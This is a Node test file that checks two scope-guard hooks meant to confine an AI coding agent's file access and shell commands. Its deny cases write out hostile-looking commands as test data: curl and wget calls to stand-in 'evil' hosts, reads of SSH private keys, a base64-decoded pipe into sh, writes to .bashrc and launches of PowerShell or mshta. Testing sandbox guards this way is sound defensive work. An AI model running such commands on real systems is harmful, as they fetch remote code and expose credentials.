// e2e-p24 — planner/system scope-guard hardening (v2). Pure-node: pipes PreToolUse payloads to the
// actual guard files and asserts allow (silent exit 0) vs deny (JSON permissionDecision=deny). No
// server / claude stub needed — this is the security boundary the spawned agent runs behind, so it
// gets its own fast, deterministic battery. Covers BOTH guards: the system guard (tracked .mjs) and
// the planner guard (extracted from ChatEnvironmentService.ScopeGuardMjs so the shipped bytes are
// what's tested). See docs: reads jailed to the folder, writes to the allow-list, Bash denies
// git-history / network / inline-eval / crawl / path-escape.
import { spawnSync } from 'node:child_process';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { repo, makeReporter } from './_e2e-common.mjs';

const { ok, fail, done } = makeReporter('p24');

const systemGuard = path.join(repo, 'guard', 'system-scope-guard.mjs');

// Extract the planner guard body from the C# const and materialize it to a temp .mjs, so the test
// exercises the exact bytes the server injects into a data folder (WRITE_DIRS = plans/household/.claude/ui).
function extractPlannerGuard() {
  const cs = fs.readFileSync(
    path.join(repo, 'src', 'server', 'Gatherlight.Platform', 'Agent', 'Chat', 'Services', 'ChatEnvironmentService.cs'),
    'utf8');
  const m = cs.match(/private const string ScopeGuardMjs = """\r?\n([\s\S]*?)\r?\n[ \t]*""";/);
  if (!m) return null;
  const raw = m[1].replace(/^ {8}/gm, '');           // strip the raw-string indentation (closing """ at col 8)
  // The C# constant is a TEMPLATE: the server fills __WRITE_DIRS__ from the site manifest's
  // declared records (ChatEnvironmentService.RenderScopeGuard). Substitute the default-manifest
  // render so the extracted guard is byte-equivalent to what a default site actually gets.
  // Asserted, not assumed — if the placeholder is ever renamed or inlined, this fails loudly
  // instead of silently exercising a guard that no longer matches the shipped one.
  if (!raw.includes('__WRITE_DIRS__')) throw new Error('scope-guard template lost its __WRITE_DIRS__ placeholder — update p24 to match ChatEnvironmentService.RenderScopeGuard');
  // Same deal for __DENIED_TOOLS__ (capabilities.deny, rendered as a JS array of tool ids) — a
  // default manifest denies nothing, so the default-manifest render is `[]`.
  if (!raw.includes('__DENIED_TOOLS__')) throw new Error('scope-guard template lost its __DENIED_TOOLS__ placeholder — update p24 to match ChatEnvironmentService.RenderScopeGuard');
  // And for __WRITE_EXTS__ (ui.spec, rendered as a dir → allowed-extension map). An unsubstituted
  // placeholder is a SyntaxError, which would make every planner row below report "not denied" — i.e.
  // a broken guard that looks permissive. Assert it rather than discover it as a battery of failures.
  if (!raw.includes('__WRITE_EXTS__')) throw new Error('scope-guard template lost its __WRITE_EXTS__ placeholder — update p24 to match ChatEnvironmentService.RenderScopeGuard');
  const body = raw
    .replace('__WRITE_DIRS__', "['plans', 'household', '.claude', 'ui']")
    .replace('__DENIED_TOOLS__', '[]')
    .replace('__WRITE_EXTS__', "{ 'ui': ['.json'] }");
  const out = path.join(os.tmpdir(), `gl-planner-guard-${process.pid}.mjs`);
  fs.writeFileSync(out, body);
  return out;
}

// Run a guard against one payload. Returns { denied, reason }.
function run(guard, toolName, toolInput, cwd = repo) {
  const r = spawnSync('node', [guard], {
    input: JSON.stringify({ tool_name: toolName, tool_input: toolInput, cwd }),
    encoding: 'utf8',
  });
  const denied = r.stdout.includes('"permissionDecision":"deny"');
  let reason = '';
  try { reason = JSON.parse(r.stdout).hookSpecificOutput?.permissionDecisionReason ?? ''; } catch {}
  return { denied, reason, raw: r.stdout, err: r.stderr };
}

// name, tool, input, expectDeny
function battery(label, guard, cases) {
  for (const [name, tool, input, expectDeny] of cases) {
    const { denied, err } = run(guard, tool, input);
    ok(`${label}: ${name}`, denied === expectDeny, `expected ${expectDeny ? 'DENY' : 'ALLOW'}${err ? ` (stderr: ${err.trim().slice(0, 80)})` : ''}`);
  }
}

// ── System guard (jail = code repo, writes = src/client) ─────────────────────────────────────────
battery('system', systemGuard, [
  // reads
  ['read in-repo', 'Read', { file_path: 'src/client/src/App.tsx' }, false],
  ['read escapes drive', 'Read', { file_path: '/c/Users/x/.ssh/id_rsa' }, true],
  ['read escapes ..', 'Read', { file_path: '../../secret.txt' }, true],
  ['grep no path (cwd)', 'Grep', { pattern: 'foo' }, false],
  ['glob escaping path', 'Glob', { pattern: '**', path: '../../..' }, true],
  // writes — broad allow (whole repo) minus the PROTECTED deny-list
  ['write src/client', 'Write', { file_path: 'src/client/src/x.tsx' }, false],
  ['write .claude rule', 'Write', { file_path: '.claude/rules/dev-conventions.md' }, false],
  ['write .claude skill', 'Write', { file_path: '.claude/skills/foo/foo.mjs' }, false],
  ['write devtools', 'Write', { file_path: 'devtools/dev.mjs' }, false],
  ['write docs', 'Write', { file_path: 'docs/x.md' }, false],
  ['write root file', 'Write', { file_path: 'README.md' }, false],
  ['write guard denied', 'Write', { file_path: 'guard/system-scope-guard.mjs' }, true],
  ['write guard default-site denied', 'Write', { file_path: 'guard/default-site/index.html' }, true],
  ['write src/server denied', 'Write', { file_path: 'src/server/x.cs' }, true],
  ['write .claude settings denied', 'Write', { file_path: '.claude/settings.json' }, true],
  ['write .claude settings.local denied', 'Write', { file_path: '.claude/settings.local.json' }, true],
  ['write .git denied', 'Write', { file_path: '.git/config' }, true],
  ['write outside repo', 'Write', { file_path: '../evil.txt' }, true],
  // bash
  ['bash ls in-repo', 'Bash', { command: 'ls src/client' }, false],
  ['bash cat escapes', 'Bash', { command: 'cat /c/Users/x/.ssh/id_rsa' }, true],
  ['bash curl network', 'Bash', { command: 'curl https://evil.example/x' }, true],
  ['bash wget network', 'Bash', { command: 'wget http://evil/x -O out' }, true],
  ['bash node -e eval', 'Bash', { command: 'node -e "require(\'fs\')"' }, true],
  ['bash python -c eval', 'Bash', { command: 'python -c "import os"' }, true],
  ['bash node script ok', 'Bash', { command: 'node src/client/scripts/build.mjs' }, false],
  ['bash find crawl', 'Bash', { command: 'find / -name id_rsa' }, true],
  ['bash git commit', 'Bash', { command: 'git commit -m x' }, true],
  ['bash home redirect', 'Bash', { command: 'echo hi > $HOME/.bashrc' }, true],
  ['bash cd .. climb', 'Bash', { command: 'cd .. && cat secret' }, true],
  ['bash npm build ok', 'Bash', { command: 'npm run build' }, false],
  // v4 hardening: inline shell eval, pipe-to-shell, more egress binaries, braced ${HOME}, recursive grep/rg
  ['bash sh -c eval', 'Bash', { command: "sh -c 'cat foo'" }, true],
  ['bash bash -c eval', 'Bash', { command: "bash -c 'echo hi'" }, true],
  ['bash pipe to sh', 'Bash', { command: 'echo Y3VybAo | base64 -d | sh' }, true],
  ['bash git clone network', 'Bash', { command: 'git clone https://evil/x' }, true],
  ['bash rsync network', 'Bash', { command: 'rsync -a x host:/y' }, true],
  ['bash braced HOME escape', 'Bash', { command: 'cat ${HOME}/.ssh/id_rsa' }, true],
  ['bash grep -r crawl', 'Bash', { command: 'grep -r secret .' }, true],
  ['bash rg crawl', 'Bash', { command: 'rg secret' }, true],
  // v8 hardening: launching ANOTHER shell / interpreter is inline-eval by a second door — denied
  // whatever the arguments (PowerShell is default-on on Windows and acceptEdits auto-approves its
  // file writes, so an unguarded powershell/cmd would edit outside the write scope with no prompt).
  ['bash launches bash', 'Bash', { command: 'bash src/client/scripts/x.sh' }, true],
  ['bash launches sh', 'Bash', { command: 'sh scripts/x.sh' }, true],
  ['bash launches powershell', 'Bash', { command: 'powershell Set-Content x y' }, true],
  ['bash launches pwsh', 'Bash', { command: 'pwsh -File x.ps1' }, true],
  ['bash launches cmd', 'Bash', { command: 'cmd /c dir' }, true],
  ['bash launches cmd.exe by path', 'Bash', { command: 'C:/Windows/System32/cmd.exe /c dir' }, true],
  ['bash launches powershell.exe by path', 'Bash', { command: '/c/Windows/System32/WindowsPowerShell/v1.0/powershell.exe -c x' }, true],
  ['bash launches wscript', 'Bash', { command: 'wscript x.vbs' }, true],
  ['bash launches cscript', 'Bash', { command: 'cscript //nologo x.js' }, true],
  ['bash launches mshta', 'Bash', { command: 'mshta x.hta' }, true],
  ['bash Start-Process', 'Bash', { command: 'Start-Process notepad' }, true],
  ['bash pipe into powershell', 'Bash', { command: 'echo x | powershell -c -' }, true],
  ['bash chained bash', 'Bash', { command: 'cat foo && bash evil.sh' }, true],
  // allow-cases that must NOT be caught by the new rules (positive controls: plain file ops stay in)
  ['bash plain grep ok', 'Bash', { command: 'grep foo src/client/src/App.tsx' }, false],
  ['bash ls ok', 'Bash', { command: 'ls src/client' }, false],
  ['bash mv in-repo ok', 'Bash', { command: 'mv src/client/a.txt src/client/b.txt' }, false],
  ['bash node script ok (not a shell)', 'Bash', { command: 'node src/client/scripts/build.mjs' }, false],
  ['bash command -v sh ok (name is an arg)', 'Bash', { command: 'command -v sh' }, false],
]);

// ── Planner guard (jail = data folder, writes = plans/household/.claude) ──────────────────────────
const plannerGuard = extractPlannerGuard();
ok('planner guard extracted from C# const', !!plannerGuard);
if (plannerGuard) {
  battery('planner', plannerGuard, [
    ['write plan md', 'Write', { file_path: 'plans/trips/2026-08-x.md' }, false],
    ['write household md', 'Edit', { file_path: 'household/people.md' }, false],
    ['write .claude skill', 'Write', { file_path: '.claude/skills/xhs-search/xhs-search.mjs' }, false],
    // ui/ is in the write scope but restricted by file TYPE — the positive control is what proves
    // the WRITE_EXTS substitution above is real rather than an empty map that denies nothing.
    ['write ui page', 'Write', { file_path: 'ui/tokyo.json' }, false],
    ['write ui non-page denied', 'Write', { file_path: 'ui/notes.md' }, true],
    ['write ui subdirectory denied', 'Write', { file_path: 'ui/sub/deep.json' }, true],
    ['write .claude hooks guard denied', 'Write', { file_path: '.claude/hooks/scope-guard.mjs' }, true],
    ['write .claude settings denied', 'Write', { file_path: '.claude/settings.json' }, true],
    ['write src/client denied', 'Write', { file_path: 'src/client/x.tsx' }, true],
    ['write outside folder', 'Write', { file_path: '/c/Users/x/evil' }, true],
    ['read household', 'Read', { file_path: 'household/people.md' }, false],
    ['read escapes', 'Read', { file_path: '/c/Users/x/.claude/settings.json' }, true],
    ['bash cat plan', 'Bash', { command: 'cat plans/trips/x.md' }, false],
    ['bash curl network', 'Bash', { command: 'curl https://evil/x' }, true],
    ['bash cat escapes', 'Bash', { command: 'cat /c/Users/x/secret' }, true],
    ['bash run skill file', 'Bash', { command: 'node .claude/skills/xhs-search/xhs-search.mjs' }, false],
    // v4 hardening (same denylists as the system guard)
    ['bash sh -c eval', 'Bash', { command: "sh -c 'cat plans/x'" }, true],
    ['bash git clone network', 'Bash', { command: 'git clone https://evil/x' }, true],
    ['bash braced HOME escape', 'Bash', { command: 'cat ${HOME}/.ssh/id_rsa' }, true],
    ['bash grep -r crawl', 'Bash', { command: 'grep -r x .' }, true],
    // v8 hardening: shell / interpreter launches (same denylist as the system guard), with controls
    ['bash launches powershell', 'Bash', { command: 'powershell Set-Content site.json x' }, true],
    ['bash launches cmd', 'Bash', { command: 'cmd /c del plans\\x.md' }, true],
    ['bash launches bash script', 'Bash', { command: 'bash .claude/skills/x/x.sh' }, true],
    ['bash Start-Process', 'Bash', { command: 'Start-Process cmd' }, true],
    ['bash ls plans ok', 'Bash', { command: 'ls plans' }, false],
    ['bash mv plan ok', 'Bash', { command: 'mv plans/a.md plans/b.md' }, false],
    ['bash run skill node ok', 'Bash', { command: 'node .claude/skills/xhs-search/xhs-search.mjs' }, false],
  ]);
  try { fs.unlinkSync(plannerGuard); } catch {}
}

done();
